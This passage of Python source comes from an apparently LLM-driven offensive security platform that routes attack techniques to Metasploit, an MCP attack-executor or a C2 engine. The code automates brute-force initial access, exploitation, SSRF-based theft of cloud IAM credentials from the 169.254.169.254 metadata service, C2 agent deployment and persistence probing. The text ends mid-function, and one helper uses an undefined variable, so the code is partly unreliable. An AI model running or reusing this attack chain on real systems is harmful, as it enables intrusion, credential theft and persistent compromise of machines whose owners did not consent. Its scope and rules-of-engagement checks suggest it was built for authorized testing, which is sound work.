# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: azz093093.830330@gmail.com

"""Act phase — route execution to MCP attack-executor, C2 engine, or mock."""

import logging
import uuid
from datetime import datetime, timezone

import asyncpg

from app.clients import BaseEngineClient, ExecutionResult
from app.config import settings
from app.services.agent_capability_matcher import AgentCapabilityMatcher
from app.services.fact_collector import FactCollector
from app.services.knowledge_base import get_exploitable_banners
from app.ws_manager import WebSocketManager

logger = logging.getLogger(__name__)

# Known vulnerable service banners -> Metasploit service name (SPEC-037 Phase 2)
_KNOWN_EXPLOITABLE_BANNERS: dict[str, str] = get_exploitable_banners()

# Keywords indicating credential/access failure (SPEC-037)
_AUTH_FAILURE_KEYWORDS = [
    "authentication failed",
    "permission denied",
    "login incorrect",
    "access denied",
    "invalid credentials",
    "connection refused",
    "no route to host",
    "connection timed out",
    "host unreachable",
]


def _is_auth_failure(error: str | None) -> bool:
    """Check if an error message indicates authentication or access failure."""
    if not error:
        return False
    lower = error.lower()
    return any(kw in lower for kw in _AUTH_FAILURE_KEYWORDS)


# -- Engine fallback chain (SPEC-040) --

# Fallback only to engines of the same technical category:
#   credential/access-based: mcp_ssh <-> c2  (both require existing access)
#   exploit-based: metasploit  (standalone; no same-category fallback)
_FALLBACK_CHAIN: dict[str, list[str]] = {
    "mcp_ssh":    ["c2"],
    "metasploit": [],
    "c2":         ["mcp_ssh"],
    "mcp_recon":  [],      # no fallback — recon either works or it doesn't
}

_RECON_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
    "T1595",  # Active Scanning
    "T1590",  # Gather Victim Network Information
    "T1592",  # Gather Victim Host Information
    "T1046",  # Network Service Discovery
    "T1018",  # Remote System Discovery
    "T1135",  # Network Share Discovery
})

# SPEC-052: Initial Access techniques routed to InitialAccessEngine
_INITIAL_ACCESS_TECHNIQUE_PREFIXES: frozenset[str] = frozenset({
    "T1110",  # Brute Force
    "T1078",  # Valid Accounts
})

# ADR-048: Web exploit techniques routed to MCP web-scanner
_WEB_EXPLOIT_TECHNIQUES: frozenset[str] = frozenset({
    "T1190",     # Exploit Public-Facing Application (SSRF variant)
    "T1078.004", # Valid Accounts: Cloud Accounts
    "T1530",     # Data from Cloud Storage Object
})

# ADR-048: SSRF proxy indicator keywords in fact values
_SSRF_PROXY_KEYWORDS: tuple[str, ...] = (
    "proxy", "redirect", "url=", "fetch=", "ssrf",
    "dest=", "path=", "forward=",
)


def _is_web_exploit_technique(technique_id: str, engine: str) -> bool:
    """Check if a technique should be routed to MCP web-scanner (ADR-048).

    Only applies when engine='mcp' — Metasploit routes are untouched.
    """
    if engine != "mcp":
        return False
    return technique_id in _WEB_EXPLOIT_TECHNIQUES


_TERMINAL_ERRORS: list[str] = [
    "scope violation",
    "platform mismatch",
    "blocked by rules of engagement",
]


def _is_terminal_error(error: str | None) -> bool:
    """Check if an error is terminal (should NOT trigger fallback)."""
    if not error:
        return False
    lower = error.lower()
    return any(te in lower for te in _TERMINAL_ERRORS)


# SPEC-053: Structured failure classification ------------------------------
#
# Every execution path in EngineRouter is expected to classify its failures
# into one of the stable category strings below, and write that category
# into ``technique_executions.failure_category``. The Orient engine reads
# these categories when building the failed-techniques context block, and
# the Rule #9 IA-exhausted pivot rule keys off ``auth_failure`` specifically.
#
# The classification is heuristic — we match lowercased substrings of the
# error text. The order of the checks matters because earlier predicates
# take precedence (auth failures often mention "failed" which would also
# match other patterns). Keep the order stable; prefer adding new keywords
# to existing categories over reordering.
#
# Expected category values:
#   auth_failure         — credentials rejected, login denied
#   service_unreachable  — network layer blocked (refused, unreachable,
#                          no route, no targetable services)
#   exploit_failed       — exploit module ran but did not yield a session
#   privilege_insufficient — executed but lacked required privilege
#   prerequisite_missing — upstream fact/credential/agent not available
#   tool_error           — MCP tool schema mismatch / validation / missing
#   timeout              — operation-level timeout (not an exploit no-session)
#   unknown              — safe fallback; heuristic did not match


def _classify_failure(error: "str | None", engine: str) -> str:
    """Classify a failure error message into a stable category string.

    This heuristic is intentionally simple and pure (no I/O). It is used
    by every execution path in ``EngineRouter`` to populate
    ``technique_executions.failure_category`` so Orient can reason about
    dead paths (SPEC-053, ADR-046).

    The ``engine`` parameter is currently unused by the matcher itself
    but is accepted so callers don't have to re-derive context, and so
    future refinements (e.g. metasploit-specific error phrasing) can
    switch on engine without changing the call sites.
    """
    if not error:
        return "unknown"
    lower = error.lower()

    # auth failures (check before generic "failed" matches)
    if any(k in lower for k in (
        "all ssh credentials failed",
        "all protocols failed",
        "permission denied",
        "login fail",
        "authentication fail",
        "credential rejected",
    )):
        return "auth_failure"

    # service reachability (network layer)
    if any(k in lower for k in (
        "connection refused",
        "no route",
        "unreachable",
        "no targetable services",
        "host is down",
    )):
        return "service_unreachable"

    # exploit engine failed to obtain a session
    if ("no session" in lower) or ("exploit aborted" in lower):
        return "exploit_failed"

    # MCP / tool schema errors — check before "timeout" so that tool
    # pydantic errors containing the word "timeout" in a field name don't
    # miscategorise.
    if any(k in lower for k in (
        "validation error",
        "field required",
        "tool not found",
    )):
        return "tool_error"

    # privilege insufficiency
    if "privilege insufficient" in lower or "not root" in lower:
        return "privilege_insufficient"

    # prerequisite missing (fact / credential / agent)
    if any(k in lower for k in (
        "prerequisite missing",
        "no credential",
        "no agent",
        "precondition",
    )):
        return "prerequisite_missing"

    # pure timeout (not a metasploit "no session within Ns" which is
    # already caught above as exploit_failed)
    if ("timeout" in lower) or ("timed out" in lower):
        return "timeout"

    return "unknown"


class EngineRouter:
    """Act phase: route technique execution to the appropriate engine."""

    def __init__(
        self,
        c2_engine: BaseEngineClient,
        fact_collector: FactCollector,
        ws_manager: WebSocketManager,
        mcp_engine: BaseEngineClient | None = None,
    ):
        self._c2_engine = c2_engine
        self._fact_collector = fact_collector
        self._ws = ws_manager
        self._capability_matcher = AgentCapabilityMatcher()
        self._mcp_engine = mcp_engine

    async def execute(
        self, db: asyncpg.Connection, technique_id: str, target_id: str,
        engine: str, operation_id: str, ooda_iteration_id: str | None = None,
    ) -> dict:
        """Execute with automatic engine fallback (SPEC-040).

        1. Try primary engine via _execute_single()
        2. On success or terminal error -> return directly
        3. On non-terminal failure -> try fallback engines from _FALLBACK_CHAIN
        4. Broadcast execution.fallback WebSocket event for each attempt
        """
        fallback_history: list[dict] = []

        # Try primary engine
        result = await self._execute_single(
            db, technique_id, target_id, engine, operation_id, ooda_iteration_id,
        )

        # Success or terminal error -> return directly
        if result.get("status") == "success" or _is_terminal_error(result.get("error")):
            result["fallback_history"] = fallback_history
            result["final_engine"] = result.get("engine", engine)
            return result

        # Record primary engine failure
        fallback_history.append({
            "engine": engine,
            "error": result.get("error"),
        })

        # Try fallback engines in order
        fallback_engines = _FALLBACK_CHAIN.get(engine, [])
        for attempt, fallback_engine in enumerate(fallback_engines, start=1):
            # Broadcast fallback event
            await self._ws.broadcast(operation_id, "execution.fallback", {
                "execution_id": result.get("execution_id"),
                "technique_id": technique_id,
                "failed_engine": fallback_history[-1]["engine"],
                "fallback_engine": fallback_engine,
                "failed_error": fallback_history[-1]["error"],
                "attempt": attempt,
                "max_attempts": len(fallback_engines),
            })

            logger.info(
                "Fallback attempt %d/%d: %s -> %s for technique %s",
                attempt, len(fallback_engines),
                fallback_history[-1]["engine"],
                fallback_engine, technique_id,
            )

            result = await self._execute_single(
                db, technique_id, target_id, fallback_engine,
                operation_id, ooda_iteration_id,
            )

            if result.get("status") == "success" or _is_terminal_error(
                result.get("error")
            ):
                result["fallback_history"] = fallback_history
                result["final_engine"] = result.get("engine", fallback_engine)
                return result

            # Record fallback failure
            fallback_history.append({
                "engine": fallback_engine,
                "error": result.get("error"),
            })

        # All engines failed — log why no further fallback is possible
        tried = [h["engine"] for h in fallback_history]
        if fallback_engines:
            logger.warning(
                "All same-category fallback engines exhausted for technique %s "
                "(tried: %s). No cross-category fallback attempted.",
                technique_id, " -> ".join(tried),
            )
        else:
            logger.warning(
                "Engine '%s' has no same-category fallback for technique %s. "
                "Execution failed without fallback attempt.",
                engine, technique_id,
            )
        result["fallback_history"] = fallback_history
        result["final_engine"] = result.get(
            "engine",
            fallback_engines[-1] if fallback_engines else engine,
        )
        return result

    async def _execute_single(
        self, db: asyncpg.Connection, technique_id: str, target_id: str,
        engine: str, operation_id: str, ooda_iteration_id: str | None = None,
    ) -> dict:
        """Execute a technique via a single engine (no fallback).

        Routing (controlled by settings.EXECUTION_ENGINE):
        - "mcp_ssh" : Use MCP attack-executor for SSH/WinRM execution (default)
        - "c2"      : Use C2EngineClient (requires alive agent; original path)
        - "mock"    : Use MockC2Client (MOCK_C2_ENGINE=true legacy path)
        """
        exec_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)

        logger.info(
            "_execute_single ENTRY: technique=%s engine=%s target=%s",
            technique_id, engine, target_id,
        )

        # Get the technique's c2_ability_id
        tech_row = await db.fetchrow(
            "SELECT mitre_id, c2_ability_id FROM techniques WHERE mitre_id = $1",
            technique_id,
        )
        ability_id = (tech_row["c2_ability_id"] if tech_row else None) or technique_id

        # -- Recon route: route recon techniques to mcp_recon (no credentials needed) --
        tech_prefix = technique_id.split(".")[0]
        if tech_prefix in _RECON_TECHNIQUE_PREFIXES:
            return await self._execute_recon_via_mcp(
                db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
            )

        # Force MCP engine for web exploit techniques regardless of Orient recommendation
        if technique_id in _WEB_EXPLOIT_TECHNIQUES:
            engine = "mcp"

        # -- ADR-048: Web exploit via MCP web-scanner (SSRF, cloud pivot) --
        # Must come BEFORE initial access check because T1078.004 (cloud
        # accounts) shares the T1078 prefix with InitialAccessEngine, but
        # when engine="mcp" it should route to web-scanner instead.
        if _is_web_exploit_technique(technique_id, engine) and settings.MCP_ENABLED and self._mcp_engine:
            return await self._execute_web_exploit_via_mcp(
                db, technique_id, target_id, operation_id, ooda_iteration_id,
            )

        # -- SPEC-052: Initial Access route (T1110/T1078 -> InitialAccessEngine) --
        if tech_prefix in _INITIAL_ACCESS_TECHNIQUE_PREFIXES:
            return await self._execute_initial_access(
                db, exec_id, now, technique_id, target_id, operation_id, ooda_iteration_id
            )

        # -- MCP route: engine == "mcp" (explicit tool-registry dispatch) --
        if engine == "mcp" and settings.MCP_ENABLED and self._mcp_engine:
            return await self._execute_mcp(
                db, exec_id, now, ability_id, technique_id, target_id,
                engine, operation_id, ooda_iteration_id,
            )

        # -- Explicit Metasploit route: engine == "metasploit" OR
        #    technique is T1190 with an exploitable banner (SPEC-053/054).
        #    Orient Rule #9 recommends T1190 engine=metasploit, but the LLM
        #    sometimes omits recommended_engine in the JSON, causing
        #    decision_engine to default to "ssh". To prevent this from
        #    silently breaking the pivot, we also check technique_id.
        if engine == "metasploit" or technique_id.startswith("T1190"):
            service = await self._has_exploitable_service(db, operation_id, target_id)
            if not service:
                service = await self._infer_exploitable_service(db, operation_id, target_id)
            if service:
                target_ip = await self._get_target_ip(db, target_id)
                if target_ip:
                    return await self._execute_metasploit(
                        db, exec_id, now, technique_id, target_id, operation_id,
                        ooda_iteration_id, service, target_ip, "metasploit",
                    )
            logger.warning(
                "engine=metasploit requested (or T1190 inferred) but no exploitable service found for %s "
                "(engine=%s, technique=%s) -- falling through",
                target_id, engine, technique_id,
            )

        # -- Metasploit route: exploit=true CVE fact -> highest priority --
        # Check BEFORE other routing (ADR-019)
        service = await self._has_exploitable_service(db, operation_id, target_id)
        if not service:
            # SPEC-037 Phase 2: banner-based fallback for known vulnerable services
            service = await self._infer_exploitable_service(db, operation_id, target_id)
        if service:
            target_ip = await self._get_target_ip(db, target_id)
            if target_ip is None:
                logger.error(
                    "Cannot resolve IP for target %s -- aborting Metasploit route",
                    target_id,
                )
            else:
                return await self._execute_metasploit(
                    db, exec_id, now, technique_id, target_id, operation_id,
                    ooda_iteration_id, service, target_ip, engine,
                )

        # -- Engine selection --
        effective_mode = settings.EXECUTION_ENGINE  # "mcp_ssh" | "c2" | "mock"
        if settings.MOCK_C2_ENGINE and effective_mode not in ("c2", "mcp_ssh"):
            effective_mode = "mock"

        if effective_mode == "mcp_ssh":
            return await self._execute_via_mcp_executor(
                db, exec_id, now, ability_id, technique_id, target_id,
                engine, operation_id, ooda_iteration_id,
            )
        elif effective_mode == "mock":
            return await self._execute_c2(
                db, exec_id, now, ability_id, technique_id, target_id,
                engine, operation_id, ooda_iteration_id, require_agent=False,
            )
        else:
            # "c2" mode -- original path with alive-agent requirement
            return await self._execute_c2(
                db, exec_id, now, ability_id, technique_id, target_id,
                engine, operation_id, ooda_iteration_id, require_agent=True,
            )

    # -- Internal helpers --

    async def _execute_recon_via_mcp(
        self, db, exec_id, now, technique_id, target_id,
        operation_id, ooda_iteration_id
    ) -> dict:
        """Route recon techniques directly to ReconEngine (no credentials needed)."""
        from app.services.recon_engine import ReconEngine
        try:
            result = await ReconEngine().scan(db, operation_id, target_id)
            facts_count = getattr(result, "facts_written", 0)
            if isinstance(result, dict):
                facts_count = result.get("facts_written", 0)
            return {
                "execution_id": exec_id, "technique_id": technique_id,
                "target_id": target_id, "engine": "mcp_recon",
                "status": "success",
                "result_summary": "Recon scan complete",
                "facts_collected_count": facts_count,
                "error": None,
            }
        except Exception as e:
            logger.exception("Recon via MCP failed for technique %s", technique_id)
            return {
                "execution_id": exec_id, "technique_id": technique_id,
                "target_id": target_id, "engine": "mcp_recon",
                "status": "failed", "error": str(e),
            }

    async def _execute_web_exploit_via_mcp(
        self, db: asyncpg.Connection, technique_id: str, target_id: str,
        operation_id: str, ooda_iteration_id: str | None,
    ) -> dict:
        """ADR-048: Route web exploit techniques to MCP web-scanner.

        Handles SSRF-to-IMDS credential exfiltration via web_http_fetch.
        Looks for proxy/redirect URLs in facts, constructs the IMDS
        request URL, and dispatches via MCP web-scanner.
        """
        exec_id = str(uuid.uuid4())
        now = datetime.now(timezone.utc)

        await db.execute(
            "INSERT INTO technique_executions "
            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
            "engine, status, started_at) "
            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
            exec_id, technique_id, target_id, operation_id,
            ooda_iteration_id, "mcp", now,
        )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": "running", "engine": "mcp",
        })

        # Find SSRF proxy URL from facts
        ssrf_url = await self._find_ssrf_proxy_url(db, operation_id)
        if not ssrf_url:
            # No proxy found — use direct metadata URL as fallback
            ssrf_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

        try:
            # Step 1: Fetch IMDS security-credentials/ (returns role name list)
            result: ExecutionResult = await self._mcp_engine.execute(
                "web-scanner:web_http_fetch",
                ssrf_url,
                params={"url": ssrf_url},
            )

            # ADR-048: Two-step IMDS chain — if response body is plain text
            # (role name, not JSON), auto-chain step 2 to get full credentials
            raw = (result.output or "").strip()
            # MCP returns JSON envelope {"facts": [...], "raw_output": "..."}
            body1 = raw
            try:
                import json as _json
                parsed = _json.loads(raw)
                body1 = (parsed.get("raw_output") or "").strip()
            except (ValueError, TypeError, AttributeError):
                pass
            if body1 and not body1.startswith("{") and not body1.startswith("[") and not body1.startswith("<"):
                role_name = body1.split("\n")[0].strip()
                if role_name:
                    credential_url = f"{ssrf_url.rstrip('/')}/{role_name}"
                    result = await self._mcp_engine.execute(
                        "web-scanner:web_http_fetch",
                        credential_url,
                        params={"url": credential_url},
                    )

            final = await self._finalize_execution(
                db, exec_id, technique_id, target_id, "mcp",
                operation_id, result,
            )
            return final

        except Exception as e:
            logger.exception(
                "Web exploit via MCP failed for technique %s", technique_id
            )
            failure_category = _classify_failure(str(e), "mcp")
            await db.execute(
                "UPDATE technique_executions SET status = 'failed', "
                "error_message = $1, failure_category = $2, completed_at = $3 "
                "WHERE id = $4",
                str(e), failure_category, datetime.now(timezone.utc), exec_id,
            )
            return {
                "execution_id": exec_id, "technique_id": technique_id,
                "target_id": target_id, "engine": "mcp",
                "status": "failed", "error": str(e),
            }

    async def _find_ssrf_proxy_url(
        self, db: asyncpg.Connection, operation_id: str,
    ) -> str | None:
        """Find the most recent SSRF proxy/redirect URL from facts.

        ADR-048: web.dir.found values have format "{full_url}|{status_code}".
        Split on '|' to extract the URL before assembling the IMDS path.
        The proxy URL is path-based (e.g. /proxy/169.254.169.254/...), so
        we append the IMDS IP directly — no http:// prefix in the path.
        """
        rows = await db.fetch(
            "SELECT trait, value FROM facts "
            "WHERE operation_id = $1 AND ("
            "  trait = 'web.vuln.ssrf' OR trait = 'web.dir.found' "
            "  OR trait = 'web.http.response'"
            ") ORDER BY "
            "  CASE WHEN value LIKE '%imds_confirmed%' THEN 0 ELSE 1 END, "
            "  collected_at DESC "
            "LIMIT 20",
            operation_id,
        )
        for row in rows:
            raw_value = row["value"]
            parts = raw_value.split("|") if "|" in raw_value else [raw_value]

            if row["trait"] == "web.vuln.ssrf":
                # Format: "type|url|canary_result" e.g. "path_proxy|http://host/proxy/...|imds_confirmed"
                # IMDS-confirmed entries already contain the full IMDS path — use directly
                url_part = parts[1] if len(parts) > 1 else parts[0]
                if "imds_confirmed" in raw_value and "169.254.169.254" in url_part:
                    # Already a full IMDS URL, just ensure it ends with security-credentials/
                    base = url_part.rstrip("/")
                    if "security-credentials" not in base:
                        return f"{base}/iam/security-credentials/"
                    return f"{base}/"
                # Non-IMDS SSRF — append IMDS path to proxy URL
                url_part = url_part.rstrip("/")
                if url_part.startswith("http"):
                    return f"{url_part}/169.254.169.254/latest/meta-data/iam/security-credentials/"
                continue
            if any(kw in value.lower() for kw in _SSRF_PROXY_KEYWORDS):
                base = value.rstrip("/")
                return f"{base}/169.254.169.254/latest/meta-data/iam/security-credentials/"
        return None

    async def _execute_initial_access(
        self, db, exec_id, now, technique_id, target_id,
        operation_id, ooda_iteration_id,
    ) -> dict:
        """SPEC-052: Route Initial Access techniques to InitialAccessEngine.

        Handles T1110 (Brute Force) and T1078 (Valid Accounts) via the
        standard OODA Act phase, including C2 bootstrap if enabled.
        """
        from app.services.initial_access_engine import InitialAccessEngine

        try:
            # Get target info for IA engine
            target_row = await db.fetchrow(
                "SELECT ip_address, hostname FROM targets WHERE id = $1",
                target_id,
            )
            if not target_row:
                return {
                    "execution_id": exec_id, "technique_id": technique_id,
                    "target_id": target_id, "engine": "initial_access",
                    "status": "failed", "error": "Target not found",
                }

            # Collect open port facts for the target — parse into {port, service} dicts
            # SPEC-058: Retry up to 3 times with 2s delay if no facts found
            # (safety net for Swarm race condition where T1046 hasn't committed yet)
            import asyncio as _asyncio

            port_facts = []
            for _retry in range(3):
                port_facts = await db.fetch(
                    "SELECT value FROM facts "
                    "WHERE source_target_id = $1 AND operation_id = $2 "
                    "AND trait = 'service.open_port'",
                    target_id, operation_id,
                )
                if port_facts:
                    break
                if _retry < 2:
                    logger.warning(
                        "SPEC-058: no service.open_port facts for target %s "
                        "(attempt %d/3, retrying in 2s)", target_id, _retry + 1,
                    )
                    await _asyncio.sleep(2)

            # Parse fact values like "22/tcp/ssh/OpenSSH_4.7p1" → {port: 22, service: "ssh"}
            # Format (from recon_engine): "<port>/<proto>/<service>/<banner>"
            services: list[dict] = []
            for f in port_facts:
                val = f["value"] or ""
                if not val:
                    continue
                parts = val.split("/")
                if len(parts) < 3:
                    continue
                try:
                    port_num = int(parts[0])
                except ValueError:
                    continue
                svc_name = (parts[2] or "").lower()
                services.append({"port": port_num, "service": svc_name})

            ia_engine = InitialAccessEngine()
            ia_result = await ia_engine.try_initial_access(
                db=db,
                operation_id=operation_id,
                target_id=target_id,
                ip=target_row["ip_address"] or target_row["hostname"],
                services=services,
            )

            # Record technique execution — ia_result is InitialAccessResult dataclass
            success = getattr(ia_result, "success", False) if not isinstance(ia_result, dict) else ia_result.get("success", False)
            method = getattr(ia_result, "method", "unknown") if not isinstance(ia_result, dict) else ia_result.get("method", "unknown")
            credential = getattr(ia_result, "credential", None) if not isinstance(ia_result, dict) else ia_result.get("credential")

            status = "success" if success else "failed"
            summary = f"Initial access via {method}: {'success' if success else 'failed'}"
            if credential:
                summary += " (credential found)"

            # SPEC-053: classify IA failure so Orient sees structured reason
            error = getattr(ia_result, "error", None) if not isinstance(ia_result, dict) else ia_result.get("error")
            failure_category = (
                _classify_failure(error, "initial_access") if not success else None
            )

            await db.execute(
                "INSERT INTO technique_executions "
                "(id, technique_id, target_id, operation_id, engine, status, "
                "result_summary, started_at, completed_at, ooda_iteration_id, "
                "failure_category) "
                "VALUES ($1, $2, $3, $4, 'initial_access', $5, $6, $7, $8, $9, $10)",
                exec_id, technique_id, target_id, operation_id,
                status, summary[:500], now, datetime.now(timezone.utc),
                ooda_iteration_id, failure_category,
            )

            # C2 bootstrap in Act phase (SPEC-052: moved from recon.py)
            if (
                success
                and method == "ssh"
                and credential
                and settings.C2_BOOTSTRAP_ENABLED
            ):
                try:
                    bootstrap_result = await ia_engine.bootstrap_c2_agent(
                        db=db,
                        operation_id=operation_id,
                        target_id=target_id,
                        credential=credential,
                    )
                    if bootstrap_result and bootstrap_result.get("success"):
                        summary += f" | C2 agent deployed (paw: {bootstrap_result.get('paw', 'unknown')})"
                        logger.info(
                            "SPEC-052: C2 agent bootstrapped in Act phase for %s",
                            target_id,
                        )
                except Exception as c2_exc:
                    logger.warning("C2 bootstrap failed in Act phase: %s", c2_exc)

            return {
                "execution_id": exec_id, "technique_id": technique_id,
                "target_id": target_id, "engine": "initial_access",
                "status": status,
                "result_summary": summary,
                "error": None if success else (error or "IA failed"),
            }

        except Exception as e:
            logger.exception("Initial Access execution failed for technique %s", technique_id)
            return {
                "execution_id": exec_id, "technique_id": technique_id,
                "target_id": target_id, "engine": "initial_access",
                "status": "failed", "error": str(e),
            }

    async def _execute_via_mcp_executor(
        self,
        db: asyncpg.Connection,
        exec_id: str,
        now: str,
        ability_id: str,
        technique_id: str,
        target_id: str,
        engine: str,
        operation_id: str,
        ooda_iteration_id: str | None,
    ) -> dict:
        """MCP attack-executor path -- route SSH/WinRM through the MCP server."""
        # Look up credential facts (priority: winrm > ssh_key > ssh)
        # SPEC-037: exclude invalidated credentials
        cred_row = await db.fetchrow(
            "SELECT trait, value FROM facts "
            "WHERE operation_id = $1 AND source_target_id = $2 "
            "AND trait IN ('credential.ssh', 'credential.ssh_key', 'credential.winrm') "
            "AND trait NOT LIKE '%.invalidated' "
            "ORDER BY CASE trait "
            "  WHEN 'credential.winrm' THEN 0 "
            "  WHEN 'credential.ssh_key' THEN 1 "
            "  ELSE 2 END "
            "LIMIT 1",
            operation_id, target_id,
        )

        if not cred_row:
            # SPEC-037 Phase 2: record the failure so Orient sees why Act failed
            error_msg = f"No valid credentials -- all invalidated for target {target_id}"
            logger.warning(
                "No credentials for target %s in operation %s", target_id, operation_id
            )
            # SPEC-053: no cred == prerequisite missing for Orient pivot logic
            await db.execute(
                "INSERT INTO technique_executions "
                "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
                "engine, status, started_at, completed_at, error_message, "
                "failure_category) "
                "VALUES ($1, $2, $3, $4, $5, $6, 'failed', $7, $8, $9, $10)",
                exec_id, technique_id, target_id, operation_id,
                ooda_iteration_id, "mcp_ssh", now, now, error_msg,
                "prerequisite_missing",
            )
            return {
                "execution_id": exec_id,
                "technique_id": technique_id,
                "target_id": target_id,
                "engine": engine,
                "status": "failed",
                "result_summary": None,
                "facts_collected_count": 0,
                "error": error_msg,
            }

        credential_string = cred_row["value"]
        cred_trait = cred_row["trait"]
        protocol = "winrm" if cred_trait == "credential.winrm" else "ssh"

        # Create execution record
        await db.execute(
            "INSERT INTO technique_executions "
            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
            "engine, status, started_at) "
            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
            exec_id, technique_id, target_id, operation_id,
            ooda_iteration_id, "mcp_ssh", now,
        )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": "running", "engine": "mcp_ssh",
        })

        platform = "windows" if protocol == "winrm" else "linux"
        output_parser = await self._get_output_parser(db, technique_id, platform=platform)

        target_ip = await self._get_target_ip(db, target_id)
        target_str = target_ip or target_id

        if not self._mcp_engine:
            logger.error("MCP engine not available for mcp_ssh execution")
            return {
                "execution_id": exec_id,
                "technique_id": technique_id,
                "target_id": target_id,
                "engine": "mcp_ssh",
                "status": "failed",
                "result_summary": None,
                "facts_collected_count": 0,
                "error": "MCP engine not available",
            }

        result: ExecutionResult = await self._mcp_engine.execute(
            "attack-executor:execute_technique",
            target_str,
            params={
                "technique_id": technique_id,
                "credential": credential_string,
                "protocol": protocol,
                "output_parser": output_parser or "",
                "persistent_session_key": operation_id,
            },
        )

        final = await self._finalize_execution(
            db, exec_id, technique_id, target_id, "mcp_ssh",
            operation_id, result,
        )
        if final.get("status") == "success":
            await self._mark_target_compromised(db, target_id, result.output)
        if settings.PERSISTENCE_ENABLED and final.get("status") == "success" and cred_row:
            from app.services.persistence_engine import PersistenceEngine  # noqa: PLC0415
            from app.database import get_pool  # noqa: PLC0415
            import asyncio  # noqa: PLC0415
            asyncio.create_task(
                PersistenceEngine().probe(get_pool, operation_id, target_id, cred_row["value"])
            )
        return final

    async def _get_output_parser(
        self, db: asyncpg.Connection, technique_id: str, platform: str = "linux"
    ) -> "str | None":
        """Read output_parser from technique_playbooks for the given platform."""
        row = await db.fetchrow(
            "SELECT output_parser FROM technique_playbooks "
            "WHERE mitre_id = $1 AND platform = $2 "
            "ORDER BY created_at DESC LIMIT 1",
            technique_id, platform,
        )
        return row["output_parser"] if row else None


    async def _mark_target_compromised(
        self,
        db: asyncpg.Connection,
        target_id: str,
        output: "str | None",
    ) -> None:
        """SSH success -> update target is_compromised and privilege_level."""
        privilege = "user"
        if output:
            if "uid=0" in output or "root" in output:
                privilege = "root"
            elif "sudo" in output.lower():
                privilege = "sudo"

        await db.execute(
            "UPDATE targets SET is_compromised = TRUE, privilege_level = $1, "
            "access_status = 'active' WHERE id = $2",
            privilege, target_id,
        )

    async def _execute_mcp(
        self,
        db: asyncpg.Connection,
        exec_id: str,
        now: str,
        ability_id: str,
        technique_id: str,
        target_id: str,
        engine: str,
        operation_id: str,
        ooda_iteration_id: str | None,
    ) -> dict:
        """MCP execution path -- call tool via MCP server."""
        await db.execute(
            "INSERT INTO technique_executions "
            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
            "engine, status, started_at) "
            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
            exec_id, technique_id, target_id, operation_id,
            ooda_iteration_id, "mcp", now,
        )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": "running", "engine": "mcp",
        })

        # Look up tool_registry for matching MCP tool (qualified name)
        try:
            tr_rows = await db.fetch(
                "SELECT config_json FROM tool_registry "
                "WHERE enabled = TRUE AND config_json LIKE '%mcp_server%' LIMIT 10"
            )
            for tr_row in tr_rows:
                import json as _json

                cfg = _json.loads(
                    tr_row["config_json"] if isinstance(tr_row, dict) else tr_row[0] or "{}"
                )
                mcp_srv = cfg.get("mcp_server")
                mcp_tool = cfg.get("mcp_tool")
                if mcp_srv and mcp_tool:
                    ability_id = f"{mcp_srv}:{mcp_tool}"
                    break
        except Exception:
            pass  # fall through to default ability_id

        target_ip = await self._get_target_ip(db, target_id)
        target_str = target_ip or target_id

        result: ExecutionResult = await self._mcp_engine.execute(
            ability_id, target_str,
        )

        final = await self._finalize_execution(
            db, exec_id, technique_id, target_id, "mcp",
            operation_id, result,
        )
        # Generic MCP execution success (recon, discovery, etc.) does NOT
        # imply shell access. Compromise gate is handled by OODA controller
        # via _SHELL_CAPABLE_TRAITS check after credential facts are written.
        return final

    async def _execute_c2(
        self,
        db: asyncpg.Connection,
        exec_id: str,
        now: str,
        ability_id: str,
        technique_id: str,
        target_id: str,
        engine: str,
        operation_id: str,
        ooda_iteration_id: str | None,
        *,
        require_agent: bool,
    ) -> dict:
        """C2 engine / mock execution path."""
        agent_paw: str | None = None

        if require_agent:
            # Select best-fit agent by platform + privilege (SPEC-022 / ADR-021)
            agent_paw = await self._capability_matcher.select_agent_for_technique(
                db, operation_id, target_id, technique_id
            )
            if agent_paw is None:
                logger.warning(
                    "No capable agent on target %s for technique %s (operation %s)",
                    target_id, technique_id, operation_id,
                )
                return {
                    "execution_id": exec_id,
                    "technique_id": technique_id,
                    "target_id": target_id,
                    "engine": engine,
                    "status": "failed",
                    "result_summary": None,
                    "facts_collected_count": 0,
                    "error": (
                        f"No agent on target {target_id} with capability for {technique_id}"
                    ),
                }

        # Create execution record
        await db.execute(
            "INSERT INTO technique_executions "
            "(id, technique_id, target_id, operation_id, ooda_iteration_id, "
            "engine, status, started_at) "
            "VALUES ($1, $2, $3, $4, $5, $6, 'running', $7)",
            exec_id, technique_id, target_id, operation_id,
            ooda_iteration_id, engine, now,
        )

        await self._ws.broadcast(operation_id, "execution.update", {
            "id": exec_id, "technique_id": technique_id,
            "status": "running", "engine": engine,
        })

        # Select and call engine
        client = self._select_client(engine)
        result: ExecutionResult = await client.execute(ability_id, agent_paw)

        return await self._finalize_execution(
            db, exec_id, technique_id, target_id, engine,
            operation_id, result,
        )

    async def _finalize_execution(
        self,
        db: asyncpg.Connection,
        exec_id: str,
        technique_id: str,
        target_id: str,
        engine: str,
        operation_id: str,
        result: ExecutionResult,
    ) -> dict:
        """Update DB, collect facts, and broadcast the final execution.update event."""
        completed_at = datetime.now(timezone.utc)
        status = "success" if result.success else "failed"
        facts_count = len(result.facts)

        # SPEC-053: classify failure reason so Orient can reason about dead paths
        failure_category = (
            _classify_failure(result.error, engine) if not result.success else None
        )

        await db.execute(
